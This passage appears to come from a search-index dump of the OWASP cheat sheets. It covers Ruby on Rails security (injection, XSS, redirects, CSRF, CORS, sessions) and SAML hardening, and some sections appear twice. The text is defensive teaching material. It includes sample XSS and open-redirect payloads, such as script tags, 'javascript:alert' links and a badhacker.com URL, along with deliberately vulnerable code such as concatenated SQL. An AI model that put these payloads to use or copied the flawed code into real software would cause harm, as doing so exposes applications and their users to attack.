work: begin if path = URI . parse ( params [ :url ] ) . path redirect_to path end rescue URI :: InvalidURIError redirect_to '/' end If matching user input against a list of approved sites or TLDs against regular expression is a must, it makes sense to leverage a library such as URI.parse() to obtain the host and then take the host value and match it against regular expression patterns. Those regular expressions must, at a minimum, have anchors or there is a greater chance of an attacker bypassing the validation routine. Example: require 'uri' host = URI . parse ( \" #{ params [ :url ] } \" ) . host # this can be vulnerable to javascript://trusted.com/%0Aalert(0) # so check .scheme and .port too validation_routine ( host ) if host def validation_routine ( host ) # Validation routine where we use \\A and \\z as anchors *not* ^ and $ # you could also check the host value against a whitelist end Also blind redirecting to user input parameter can lead to XSS. Example code: redirect_to params [ :to ] Will give this URL: http://example.com/redirect?to[status]=200&to[protocol]=javascript:alert(0)// The obvious fix for this type of vulnerability is to restrict to specific Top-Level Domains (TLDs), statically define specific sites, or map a key to it's value. Example code: ACCEPTABLE_URLS = { 'our_app_1' => \"https://www.example_commerce_site.com/checkout\" , 'our_app_2' => \"https://www.example_user_site.com/change_settings\" } Will give this URL: http://www.example.com/redirect?url=our_app_1 Redirection handling code: def redirect url = ACCEPTABLE_URLS [ \" #{ params [ :url ] } \" ] redirect_to url if url end There is a more general OWASP resource about unvalidated redirects and forwards . Dynamic Render Paths \u00b6 In Rails, controller actions and views can dynamically determine which view or partial to render by calling the render method. If user input is used in or for the template name, an attacker could cause the application to render an arbitrary view, such as an administrative page. Care should be taken when using user input to determine which view to render. If possible, avoid any user input in the name or path to the view. Cross Origin Resource Sharing \u00b6 Occasionally, a need arises to share resources with another domain. For example, a file-upload function that sends data via an AJAX request to another domain. In these cases, the same-origin rules followed by web browsers must be bent. Modern browsers, in compliance with HTML5 standards, will allow this to occur but in order to do this; a couple precautions must be taken. When using a nonstandard HTTP construct, such as an atypical Content-Type header, for example, the following applies: The receiving site should whitelist only those domains allowed to make such requests as well as set the Access-Control-Allow-Origin header in both the response to the OPTIONS request and POST request. This is because the OPTIONS request is sent first, in order to determine if the remote or receiving site allows the requesting domain. Next, a second request, a POST request, is sent. Once again, the header must be set in order for the transaction to be shown as successful. When standard HTTP constructs are used: The request is sent and the browser, upon receiving a response, inspects the response headers in order to determine if the response can and should be processed. Whitelist in Rails: Gemfile: gem 'rack-cors' , :require = > 'rack/cors' config/application.rb: module Sample class Application < Rails :: Application config . middleware . use Rack :: Cors do allow do origins 'someserver.example.com' resource %r{/users/\\d+.json} , :headers => [ 'Origin' , 'Accept' , 'Content-Type' ] , :methods => [ :post , :get ] end end end end Security-related headers \u00b6 To set a header value, simply access the response.headers object as a hash inside your controller (often in a before/after_filter). response . headers [ 'X-header-name' ] = 'value' Rails provides the default_headers functionality that will automatically apply the values supplied. This works for most headers in almost all cases. ActionDispatch :: Response . default_headers = { 'X-Frame-Options' => 'SAMEORIGIN' , 'X-Content-Type-Options' => 'nosniff' , 'X-XSS-Protection' => '0' } Strict transport security is a special case, it is set in an environment file (e.g. production.rb ) config . force_ssl = true For those not on the edge, there is a library ( secure_headers ) for the same behavior with content security policy abstraction provided. It will automatically apply logic based on the user agent to produce a concise set of headers. Business Logic Bugs \u00b6 Any application in any technology can contain business logic errors that result in security bugs. Business logic bugs are difficult to impossible to detect using automated tools. The best ways to prevent business logic security bugs are to do code review, pair program and write unit tests. Attack Surface \u00b6 Generally speaking, Rails avoids open redirect and path traversal types of vulnerabilities because of its /config/routes.rb file which dictates what URLs should be accessible and handled by which controllers. The routes file is a great place to look when thinking about the scope of the attack surface. An example might be as follows: # this is an example of what NOT to do match ':controller(/:action(/:id(.:format)))' In this case, this route allows any public method on any controller to be called as an action. As a developer, you want to make sure that users can only reach the controller methods intended and in the way intended. Sensitive Files \u00b6 Many Ruby on Rails apps are open source and hosted on publicly available source code repositories. Whether that is the case or the code is committed to a corporate source control system, there are certain files that should be either excluded or carefully managed. /config/database.yml - May contain production credentials. /config/initializers/secret_token.rb - Contains a secret used to hash session cookie. /db/seeds.rb - May contain seed data including bootstrap admin user. /db/development.sqlite3 - May contain real data. Encryption \u00b6 Rails uses OS encryption. Generally speaking, it is always a bad idea to write your own encryption. Devise by default uses bcrypt for password hashing, which is an appropriate solution. Typically, the following config causes the 10 stretches for production: /config/initializers/devise.rb config . stretches = Rails . env . test? ? 1 : 10 Updating Rails and Having a Process for Updating Dependencies \u00b6 In early 2013, a number of critical vulnerabilities were identified in the Rails Framework. Organizations that had fallen behind current versions had more trouble updating and harder decisions along the way, including patching the source code for the framework itself. An additional concern with Ruby applications in general is that most libraries (gems) are not signed by their authors. It is literally impossible to build a Rails based project with libraries that come from trusted sources. One good practice might be to audit the gems you are using. In general, it is important to have a process for updating dependencies. An example process might define three mechanisms for triggering an update of response: Every month/quarter dependencies in general are updated. Every week important security vulnerabilities are taken into account and potentially trigger an update. In EXCEPTIONAL conditions, emergency updates may need to be applied. Tools \u00b6 Use brakeman , an open source code analysis tool for Rails applications, to identify many potential issues. It will not necessarily produce comprehensive security findings, but it can find easily exposed issues. A great way to see potential issues in Rails is to review the brakeman documentation of warning types. There are emerging tools that can be used to track security issues in dependency sets, like automated scanning from GitHub and GitLab . Another area of tooling is the security testing tool Gauntlt which is built on cucumber and uses gherkin syntax to define attack files. Launched in May 2013 and very similar to brakeman scanner, the dawnscanner rubygem is a static analyzer for security issues that work with Rails, Sinatra and Padrino web applications. Version 1.6.6 has more than 235 ruby specific CVE security checks. Related Articles and References \u00b6 The Official Rails Security Guide OWASP Ruby on Rails Security Guide The Ruby Security Reviewers Guide The Ruby on Rails Security Mailing List Rails Insecure Defaults","title":"Ruby on Rails"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#ruby-on-rails-cheatsheet","text":"","title":"Ruby on Rails Cheatsheet"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#introduction","text":"This Cheatsheet intends to provide quick basic Ruby on Rails security tips for developers. It complements, augments or emphasizes points brought up in the Rails security guide from rails core. The Rails framework abstracts developers from quite a bit of tedious work and provides the means to accomplish complex tasks quickly and with ease. New developers, those unfamiliar with the inner-workings of Rails, likely need a basic set of guidelines to secure fundamental aspects of their application. The intended purpose of this doc is to be that guide.","title":"Introduction"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#items","text":"","title":"Items"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#command-injection","text":"Ruby offers a function called \"eval\" which will dynamically build new Ruby code based on Strings. It also has a number of ways to call system commands. eval ( \"ruby code here\" ) system ( \"os command here\" ) `ls -al /` # (backticks contain os command) exec ( \"os command here\" ) open ( \"\\| os command here\" ) While the power of these commands is quite useful, extreme care should be taken when using them in a Rails based application. Usually, its just a bad idea. If need be, a whitelist of possible values should be used and any input should be validated as thoroughly as possible. The guides from Rails and OWASP contain further information on command injection.","title":"Command Injection"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#sql-injection","text":"Ruby on Rails is often used with an ORM called ActiveRecord, though it is flexible and can be used with other data sources. Typically very simple Rails applications use methods on the Rails models to query data. Many use cases protect for SQL Injection out of the box. However, it is possible to write code that allows for SQL Injection. name = params [ :name ] @projects = Project . where ( \"name like '\" + name + \"'\" ); The statement is injectable because the name parameter is not escaped. Here is the idiom for building this kind of statement: @projects = Project . where ( \"name like ?\" , \"% #{ params [ :name ] } %\" ) Use caution not to build SQL statements based on user controlled input. A list of more realistic and detailed examples is here: rails-sqli.org . OWASP has extensive information about SQL Injection .","title":"SQL Injection"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#cross-site-scripting-xss","text":"By default, protection against XSS comes as the default behavior. When string data is shown in views, it is escaped prior to being sent back to the browser. This goes a long way, but there are common cases where developers bypass this protection - for example to enable rich text editing. In the event that you want to pass variables to the front end with tags intact, it is tempting to do the following in your .erb file (ruby markup). # Wrong! Do not do this! < %= raw @product.name %> # Wrong! Do not do this! <%= @product . name . html_safe %> # Wrong! Do not do this! <%= content_tag @product.name %> Unfortunately, any field that uses raw , html_safe , content_tag or similar like this will be a potential XSS target. Note that there are also widespread misunderstandings about html_safe() . This writeup describes the underlying SafeBuffer mechanism in detail. Other tags that change the way strings are prepared for output can introduce similar issues, including content_tag. content_tag ( \"/><script>alert('hack!');</script>\" ) # XSS example # produces: </><script>alert('hack!');</script>><//><script>alert('hack!');</script>> The method html_safe of String is somewhat confusingly named. It means that we know for sure the content of the string is safe to include in HTML without escaping. This method itself is un-safe! If you must accept HTML content from users, consider a markup language for rich text in an application (Examples include: Markdown and textile) and disallow HTML tags. This helps ensures that the input accepted doesn't include HTML content that could be malicious. If you cannot restrict your users from entering HTML, consider implementing content security policy to disallow the execution of any JavaScript. And finally, consider using the #sanitize method that let's you whitelist allowed tags. Be careful, this method has been shown to be flawed numerous times and will never be a complete solution. An often overlooked XSS attack vector for older versions of rails is the href value of a link: <%= link_to \"Personal Website\" , @user . website %> If @user.website contains a link that starts with javascript: , the content will execute when a user clicks the generated link: < a href = \"javascript:alert('Haxored')\" > Personal Website </ a > Newer Rails versions escape such links in a better way. link_to \"Personal Website\" , 'javascript:alert(1);' . html_safe () # Will generate: # \"<a href=\"javascript:alert(1);\">Personal Website</a>\" Using Content Security Policy is one more security measure to forbid execution for links starting with javascript: . Brakeman scanner helps in finding XSS problems in Rails apps. OWASP provides more general information about XSS in a top level page: Cross-site Scripting (XSS) .","title":"Cross-site Scripting (XSS)"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#sessions","text":"By default, Ruby on Rails uses a Cookie based session store. What that means is that unless you change something, the session will not expire on the server. That means that some default applications may be vulnerable to replay attacks. It also means that sensitive information should never be put in the session. The best practice is to use a database based session, which thankfully is very easy with Rails: Project :: Application . config . session_store :active_record_store There is an Session Management Cheat Sheet .","title":"Sessions"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#authentication","text":"As with all sensitive data, start securing your authentication with enabling TLS in your configuration: # config/environments/production.rb # Force all access to the app over SSL, use Strict-Transport-Security, # and use secure cookies config . force_ssl = true Uncomment the line 3 as above in your configuration. Generally speaking, Rails does not provide authentication by itself. However, most developers using Rails leverage libraries such as Devise or AuthLogic to provide authentication. To enable authentication it is possible to use Devise gem. Install it using: gem 'devise' Then install it to the user model: rails generate devise:install Next, specify which resources (routes) require authenticated access in routes: Rails . application . routes . draw do authenticate :user do resources :something do # these resource require authentication ... end end devise_for :users # sign-up/-in/out routes root to : 'static#home' # no authentication required end To enforce password complexity, it is possible to use zxcvbn gem . Configure your user model with it: class User < ApplicationRecord devise :database_authenticatable , # other devise features, then :zxcvbnable end And configure the required password complexity: # in config/initializers/devise.rb Devise . setup do \\ | config \\ | # zxcvbn score for devise config . min_password_score = 4 # complexity score here. ... You can try out this PoC to learn more about it. Next, omniauth gem allows for multiple strategies for authentication. Using it one can configure secure authentication with Facebook, LDAP and many other providers. Read on here .","title":"Authentication"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#token-authentication","text":"Devise usually uses Cookies for authentication. In the case token authentication is wished instead, it could be implemented with a gem devise_token_auth . It supports multiple front end technologies, for example angular2-token. This gem is configured similar to the devise gem itself. It also requires omniauth as a dependency. # token-based authentication gem 'devise_token_auth' gem 'omniauth' Then a route is defined: mount_devise_token_auth_for 'User' , at : 'auth' And the User model is modified accordingly. These actions can be done with one command: rails g devise_token_auth:install [ USER_CLASS ] [ MOUNT_PATH ] You may need to edit the generated migration to avoid unnecessary fields and/or field duplication depending on your use case. Note: when you use only token authentication, there is no more need in CSRF protection in controllers. If you use both ways: cookies and tokens, the paths where cookies are used for authentication still must be protected from forgery! There is an Authentication Cheat Sheet .","title":"Token Authentication"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#insecure-direct-object-reference-or-forceful-browsing","text":"By default, Ruby on Rails apps use a RESTful URI structure. That means that paths are often intuitive and guessable. To protect against a user trying to access or modify data that belongs to another user, it is important to specifically control actions. Out of the gate on a vanilla Rails application, there is no such built-in protection. It is possible to do this by hand at the controller level. It is also possible, and probably recommended, to consider resource-based access control libraries such as cancancan (cancan replacement) or pundit to do this. This ensures that all operations on a database object are authorized by the business logic of the application. More general information about this class of vulnerability is in the OWASP Top 10 Page .","title":"Insecure Direct Object Reference or Forceful Browsing"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#csrf-cross-site-request-forgery","text":"Ruby on Rails has specific, built-in support for CSRF tokens. To enable it, or ensure that it is enabled, find the base ApplicationController and look for a directive such as the following: class ApplicationController < ActionController :: Base protect_from_forgery Note that the syntax for this type of control includes a way to add exceptions. Exceptions may be useful for APIs or other reasons - but should be reviewed and consciously included. In the example below, the Rails ProjectController will not provide CSRF protection for the show method. class ProjectController < ApplicationController protect_from_forgery except : :show Also note that by default Rails does not provide CSRF protection for any HTTP GET request. Note: if you use token authentication only, there is no need to protect from CSRF in controllers like this. If cookie-based authentication is used on some paths, then the protections is still required on them. There is a top level OWASP page for Cross-Site Request Forgery (CSRF) .","title":"CSRF (Cross Site Request Forgery)"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#redirects-and-forwards","text":"Web applications often require the ability to dynamically redirect users based on client-supplied data. To clarify, dynamic redirection usually entails the client including a URL in a parameter within a request to the application. Once received by the application, the user is redirected to the URL specified in the request. For example: http://www.example.com/redirect?url=http://www.example_commerce_site.com/checkout The above request would redirect the user to http://www.example.com/checkout . The security concern associated with this functionality is leveraging an organization's trusted brand to phish users and trick them into visiting a malicious site, in our example, badhacker.com . Example: http://www.example.com/redirect?url=http://badhacker.com The most basic, but restrictive protection is to use the :only_path option. Setting this to true will essentially strip out any host information. However, the :only_path option must be part of the first argument. If the first argument is not a hash table, then there is no way to pass in this option. In the absence of a custom helper or whitelist, this is one approach that can work: begin if path = URI . parse ( params [ :url ] ) . path redirect_to path end rescue URI :: InvalidURIError redirect_to '/' end If matching user input against a list of approved sites or TLDs against regular expression is a must, it makes sense to leverage a library such as URI.parse() to obtain the host and then take the host value and match it against regular expression patterns. Those regular expressions must, at a minimum, have anchors or there is a greater chance of an attacker bypassing the validation routine. Example: require 'uri' host = URI . parse ( \" #{ params [ :url ] } \" ) . host # this can be vulnerable to javascript://trusted.com/%0Aalert(0) # so check .scheme and .port too validation_routine ( host ) if host def validation_routine ( host ) # Validation routine where we use \\A and \\z as anchors *not* ^ and $ # you could also check the host value against a whitelist end Also blind redirecting to user input parameter can lead to XSS. Example code: redirect_to params [ :to ] Will give this URL: http://example.com/redirect?to[status]=200&to[protocol]=javascript:alert(0)// The obvious fix for this type of vulnerability is to restrict to specific Top-Level Domains (TLDs), statically define specific sites, or map a key to it's value. Example code: ACCEPTABLE_URLS = { 'our_app_1' => \"https://www.example_commerce_site.com/checkout\" , 'our_app_2' => \"https://www.example_user_site.com/change_settings\" } Will give this URL: http://www.example.com/redirect?url=our_app_1 Redirection handling code: def redirect url = ACCEPTABLE_URLS [ \" #{ params [ :url ] } \" ] redirect_to url if url end There is a more general OWASP resource about unvalidated redirects and forwards .","title":"Redirects and Forwards"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#dynamic-render-paths","text":"In Rails, controller actions and views can dynamically determine which view or partial to render by calling the render method. If user input is used in or for the template name, an attacker could cause the application to render an arbitrary view, such as an administrative page. Care should be taken when using user input to determine which view to render. If possible, avoid any user input in the name or path to the view.","title":"Dynamic Render Paths"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#cross-origin-resource-sharing","text":"Occasionally, a need arises to share resources with another domain. For example, a file-upload function that sends data via an AJAX request to another domain. In these cases, the same-origin rules followed by web browsers must be bent. Modern browsers, in compliance with HTML5 standards, will allow this to occur but in order to do this; a couple precautions must be taken. When using a nonstandard HTTP construct, such as an atypical Content-Type header, for example, the following applies: The receiving site should whitelist only those domains allowed to make such requests as well as set the Access-Control-Allow-Origin header in both the response to the OPTIONS request and POST request. This is because the OPTIONS request is sent first, in order to determine if the remote or receiving site allows the requesting domain. Next, a second request, a POST request, is sent. Once again, the header must be set in order for the transaction to be shown as successful. When standard HTTP constructs are used: The request is sent and the browser, upon receiving a response, inspects the response headers in order to determine if the response can and should be processed. Whitelist in Rails: Gemfile: gem 'rack-cors' , :require = > 'rack/cors' config/application.rb: module Sample class Application < Rails :: Application config . middleware . use Rack :: Cors do allow do origins 'someserver.example.com' resource %r{/users/\\d+.json} , :headers => [ 'Origin' , 'Accept' , 'Content-Type' ] , :methods => [ :post , :get ] end end end end","title":"Cross Origin Resource Sharing"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#security-related-headers","text":"To set a header value, simply access the response.headers object as a hash inside your controller (often in a before/after_filter). response . headers [ 'X-header-name' ] = 'value' Rails provides the default_headers functionality that will automatically apply the values supplied. This works for most headers in almost all cases. ActionDispatch :: Response . default_headers = { 'X-Frame-Options' => 'SAMEORIGIN' , 'X-Content-Type-Options' => 'nosniff' , 'X-XSS-Protection' => '0' } Strict transport security is a special case, it is set in an environment file (e.g. production.rb ) config . force_ssl = true For those not on the edge, there is a library ( secure_headers ) for the same behavior with content security policy abstraction provided. It will automatically apply logic based on the user agent to produce a concise set of headers.","title":"Security-related headers"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#business-logic-bugs","text":"Any application in any technology can contain business logic errors that result in security bugs. Business logic bugs are difficult to impossible to detect using automated tools. The best ways to prevent business logic security bugs are to do code review, pair program and write unit tests.","title":"Business Logic Bugs"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#attack-surface","text":"Generally speaking, Rails avoids open redirect and path traversal types of vulnerabilities because of its /config/routes.rb file which dictates what URLs should be accessible and handled by which controllers. The routes file is a great place to look when thinking about the scope of the attack surface. An example might be as follows: # this is an example of what NOT to do match ':controller(/:action(/:id(.:format)))' In this case, this route allows any public method on any controller to be called as an action. As a developer, you want to make sure that users can only reach the controller methods intended and in the way intended.","title":"Attack Surface"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#sensitive-files","text":"Many Ruby on Rails apps are open source and hosted on publicly available source code repositories. Whether that is the case or the code is committed to a corporate source control system, there are certain files that should be either excluded or carefully managed. /config/database.yml - May contain production credentials. /config/initializers/secret_token.rb - Contains a secret used to hash session cookie. /db/seeds.rb - May contain seed data including bootstrap admin user. /db/development.sqlite3 - May contain real data.","title":"Sensitive Files"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#encryption","text":"Rails uses OS encryption. Generally speaking, it is always a bad idea to write your own encryption. Devise by default uses bcrypt for password hashing, which is an appropriate solution. Typically, the following config causes the 10 stretches for production: /config/initializers/devise.rb config . stretches = Rails . env . test? ? 1 : 10","title":"Encryption"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#updating-rails-and-having-a-process-for-updating-dependencies","text":"In early 2013, a number of critical vulnerabilities were identified in the Rails Framework. Organizations that had fallen behind current versions had more trouble updating and harder decisions along the way, including patching the source code for the framework itself. An additional concern with Ruby applications in general is that most libraries (gems) are not signed by their authors. It is literally impossible to build a Rails based project with libraries that come from trusted sources. One good practice might be to audit the gems you are using. In general, it is important to have a process for updating dependencies. An example process might define three mechanisms for triggering an update of response: Every month/quarter dependencies in general are updated. Every week important security vulnerabilities are taken into account and potentially trigger an update. In EXCEPTIONAL conditions, emergency updates may need to be applied.","title":"Updating Rails and Having a Process for Updating Dependencies"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#tools","text":"Use brakeman , an open source code analysis tool for Rails applications, to identify many potential issues. It will not necessarily produce comprehensive security findings, but it can find easily exposed issues. A great way to see potential issues in Rails is to review the brakeman documentation of warning types. There are emerging tools that can be used to track security issues in dependency sets, like automated scanning from GitHub and GitLab . Another area of tooling is the security testing tool Gauntlt which is built on cucumber and uses gherkin syntax to define attack files. Launched in May 2013 and very similar to brakeman scanner, the dawnscanner rubygem is a static analyzer for security issues that work with Rails, Sinatra and Padrino web applications. Version 1.6.6 has more than 235 ruby specific CVE security checks.","title":"Tools"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#related-articles-and-references","text":"The Official Rails Security Guide OWASP Ruby on Rails Security Guide The Ruby Security Reviewers Guide The Ruby on Rails Security Mailing List Rails Insecure Defaults","title":"Related Articles and References"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html","text":"SAML Security Cheat Sheet \u00b6 Introduction \u00b6 The S ecurity A ssertion M arkup L anguage ( SAML ) is an open standard for exchanging authorization and authentication information. The Web Browser SAML/SSO Profile with Redirect/POST bindings is one of the most common SSO implementation. This cheatsheet will focus primarily on that profile. Validate Message Confidentiality and Integrity \u00b6 TLS 1.2 is the most common solution to guarantee message confidentiality and integrity at the transport layer. Refer to SAML Security (section 4.2.1) for additional information. This step will help counter the following attacks: Eavesdropping 7.1.1.1 Theft of User Authentication Information 7.1.1.2 Theft of the Bearer Token 7.1.1.3 Message Deletion 7.1.1.6 Message Modification 7.1.1.7 Man-in-the-middle 7.1.1.8 A digitally signed message with a certified key is the most common solution to guarantee message integrity and authentication. Refer to SAML Security (section 4.3) for additional information. This step will help counter the following attacks: Man-in-the-middle 6.4.2 Forged Assertion 6.4.3 Message Modification 7.1.1.7 Assertions may be encrypted via XMLEnc to prevent disclosure of sensitive attributes post transportation. Refer to SAML Security (section 4.2.2) for additional information. This step will help counter the following attacks: Theft of User Authentication Information 7.1.1.2 Validate Protocol Usage \u00b6 This is a common area for security gaps - see Google SSO vulnerability for a real life example. Their SSO profile was vulnerable to a Man-in-the-middle attack from a malicious SP (Service Provider). The SSO Web Browser Profile is most susceptible to attacks from trusted partners. This particular security flaw was exposed because the SAML Response did not contain all of the required data elements necessary for a secure message exchange. Following the SAML Profile usage requirements for AuthnRequest (4.1.4.1) and Response (4.1.4.2) will help counter this attack. The AVANTSSAR team suggested the following data elements should be required: AuthnRequest(ID, SP): An AuthnRequest must contain and ID and SP . Where ID is a string uniquely identifying the request and an SP identifies the Service Provider that initiated the request. Furthermore, the request ID attribute must be returned in the response ( InResponseTo=\"<requestId>\" ). InResponseTo helps guarantee authenticity of the response from the trusted IdP. This was one of the missing attributes that left Google's SSO vulnerable. Response(ID, SP, IdP, {AA} K -1/IdP): A Response must contain all these elements. Where ID is a string uniquely identifying the response. SP identifies the recipient of the response. IdP identifies the identity provider authorizing the response. {AA} K -1/IdP is the assertion digitally signed with the private key of the IdP . AuthAssert(ID, C, IdP, SP): An authentication assertion must exist within the Response. It must contain an ID , a client (C) , an identity provider (IdP) , and a service provider (SP) identifier. Validate Signatures \u00b6 Vulnerabilities in SAML implementations due to XML Signature Wrapping attacks were described in 2012, On Breaking SAML: Be Whoever You Want to Be . The following recommendations were proposed in response ( Secure SAML validation to prevent XML signature wrapping attacks ): Always perform schema validation on the XML document prior to using it for any security-\u00adrelated purposes: Always use local, trusted copies of schemas for validation. Never allow automatic download of schemas from third party locations. If possible, inspect schemas and perform schema hardening, to disable possible wildcard \u00adtype or relaxed processing statements. Securely validate the digital signature: If you expect only one signing key, use StaticKeySelector . Obtain the key directly from the identity provider, store it in local file and ignore any KeyInfo elements in the document. If you expect more than one signing key, use X509KeySelector (the JKS variant). Obtain these keys directly form the identity providers, store them in local JKS and ignore any KeyInfo elements in the document. If you expect a heterogeneous signed documents (many certificates from many identity providers, multi\u00adlevel validation paths), implement full trust establishment model based on PKIX and trusted root certificates. Avoid signature-wrapping attacks. Never use getElementsByTagName to select security related elements in an XML document without prior validation. Always use absolute XPath expressions to select elements, unless a hardened schema is used for validation. Validate Protocol Processing Rules \u00b6 This is another common area for security gaps simply because of the vast number of steps to assert. Processing a SAML response is an expensive operation but all steps must be validated: Validate AuthnRequest processing rules. Refer to SAML Core (3.4.1.4) for all AuthnRequest processing rules. This step will help counter the following attacks: Man-in-the-middle (6.4.2) Validate Response processing rules. Refer to SAML Profiles (4.1.4.3) for all Response processing rules. This step will help counter the following attacks: Stolen Assertion (6.4.1) Man-in-the-middle (6.4.2) Forged Assertion (6.4.3) Browser State Exposure (6.4.4) Validate Binding Implementation \u00b6 For an HTTP Redirect Binding refer to SAML Binding (3.4). To view an encoding example, you may want to reference RequestUtil.java found within Google's reference implementation . For an HTTP POST Binding refer to SAML Binding (3.5). The caching considerations are also very important. If a SAML protocol message gets cached, it can subsequently be used as a Stolen Assertion (6.4.1) or Replay (6.4.5) attack. Validate Security Countermeasures \u00b6 Revisit each security threat that exists within the SAML Security document and assert you have applied the appropriate countermeasures for threats that may exist for your particular implementation. Additional countermeasures considered should include: Prefer IP Filtering when appropriate. For example, this countermeasure could have prevented Google's initial security flaw if Google provided each trusted partner with a separate endpoint and setup an IP filter for each endpoint. This step will help counter the following attacks: Stolen Assertion (6.4.1) Man-in-the-middle (6.4.2) Prefer short lifetimes on the SAML Response. This step will help counter the following attacks: Stolen Assertion (6.4.1) Browser State Exposure (6.4.4) Prefer OneTimeUse on the SAML Response. This step will help counter the following attacks: Browser State Exposure (6.4.4) Replay (6.4.5) Need an architectural diagram? The SAML technical overview contains the most complete diagrams. For the Web Browser SSO Profile with Redirect/POST bindings refer to the section 4.1.3. In fact, of all the SAML documentation, the technical overview is the most valuable from a high-level perspective. Unsolicited Response (ie. IdP Initiated SSO) Considerations for Service Providers \u00b6 Unsolicited Response is inherently less secure by design due to the lack of CSRF protection. However, it is supported by many due to the backwards compatibility feature of SAML 1.1. The general security recommendation is to not support this type of authentication, but if it must be enabled, the following steps (in additional to everything mentioned above) should help you secure this flow: Follow the validation process mentioned in SAML Profiles (section 4.1.5) . This step will help counter the following attacks: Replay (6.1.2) Message Insertion (6.1.3) If the contract of the RelayState parameter is a URL, make sure the URL is validated and whitelisted. This step will help counter the following attack: Open Redirect Implement proper replay detection either at the response or assertion level. This will help counter the following attack: Replay (6.1.2) Identity Provider and Service Provider Considerations \u00b6 The SAML protocol is rarely the vector of choice, though it's important to have cheatsheets to make sure that this is robust. The various endpoints are more targeted, so how the SAML token is generated and how it is consumed are both important in practice. Identity Provider (IdP) Considerations \u00b6 Validate X.509 Certificate for algorithm compatibility, strength of encryption, export restrictions Validate Strong Authentication options for generating the SAML token IDP validation (which IDP mints the token) Use/Trust Root CAs whenever possible Synchronize to a common Internet timesource Define levels of assurance for identity verification Prefer asymmetric identifiers for identity assertions over personally identifiable information (e.g. SSNs, etc) Sign each individual Assertion or the entire Response element Service Provider (SP) Considerations \u00b6 Validating session state for user Level of granularity in setting authZ context when consuming SAML token (do you use groups, roles, attributes) Ensure each Assertion or the entire Response element is signed Validate Signatures Validate if signed by authorized IDP Validate IDP certificates for expiration and revocation against CRL/OCSP Validate NotBefore and NotOnorAfter Validate Recipient attribute Define criteria for SAML logout Exchange assertions only over secure transports Define criteria for session management Verify user identities obtained from SAML ticket assertions whenever possible. Input Validation \u00b6 Just because SAML is a security protocol does not mean that input validation goes away. Ensure that all SAML providers/consumers do proper input validation . Cryptography \u00b6 Solutions relying cryptographic algorithms need to follow the latest developments in cryptoanalysis. Ensure all SAML elements in the chain use strong encryption Consider deprecating support for insecure XMLEnc algorithms","title":"SAML Security"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#saml-security-cheat-sheet","text":"","title":"SAML Security Cheat Sheet"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#introduction","text":"The S ecurity A ssertion M arkup L anguage ( SAML ) is an open standard for exchanging authorization and authentication information. The Web Browser SAML/SSO Profile with Redirect/POST bindings is one of the most common SSO implementation. This cheatsheet will focus primarily on that profile.","title":"Introduction"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#validate-message-confidentiality-and-integrity","text":"TLS 1.2 is the most common solution to guarantee message confidentiality and integrity at the transport layer. Refer to SAML Security (section 4.2.1) for additional information. This step will help counter the following attacks: Eavesdropping 7.1.1.1 Theft of User Authentication Information 7.1.1.2 Theft of the Bearer Token 7.1.1.3 Message Deletion 7.1.1.6 Message Modification 7.1.1.7 Man-in-the-middle 7.1.1.8 A digitally signed message with a certified key is the most common solution to guarantee message integrity and authentication. Refer to SAML Security (section 4.3) for additional information. This step will help counter the following attacks: Man-in-the-middle 6.4.2 Forged Assertion 6.4.3 Message Modification 7.1.1.7 Assertions may be encrypted via XMLEnc to prevent disclosure of sensitive attributes post transportation. Refer to SAML Security (section 4.2.2) for additional information. This step will help counter the following attacks: Theft of User Authentication Information 7.1.1.2","title":"Validate Message Confidentiality and Integrity"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#validate-protocol-usage","text":"This is a common area for security gaps - see Google SSO vulnerability for a real life example. Their SSO profile was vulnerable to a Man-in-the-middle attack from a malicious SP (Service Provider). The SSO Web Browser Profile is most susceptible to attacks from trusted partners. This particular security flaw was exposed because the SAML Response did not contain all of the required data elements necessary for a secure message exchange. Following the SAML Profile usage requirements for AuthnRequest (4.1.4.1) and Response (4.1.4.2) will help counter this attack. The AVANTSSAR team suggested the following data elements should be required: AuthnRequest(ID, SP): An AuthnRequest must contain and ID and SP . Where ID is a string uniquely identifying the request and an SP identifies the Service Provider that initiated the request. Furthermore, the request ID attribute must be returned in the response ( InResponseTo=\"<requestId>\" ). InResponseTo helps guarantee authenticity of the response from the trusted IdP. This was one of the missing attributes that left Google's SSO vulnerable. Response(ID, SP, IdP, {AA} K -1/IdP): A Response must contain all these elements. Where ID is a string uniquely identifying the response. SP identifies the recipient of the response. IdP identifies the identity provider authorizing the response. {AA} K -1/IdP is the assertion digitally signed with the private key of the IdP . AuthAssert(ID, C, IdP, SP): An authentication assertion must exist within the Response. It must contain an ID , a client (C) , an identity provider (IdP) , and a service provider (SP) identifier.","title":"Validate Protocol Usage"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#validate-signatures","text":"Vulnerabilities in SAML implementations due to XML Signature Wrapping attacks were described in 2012, On 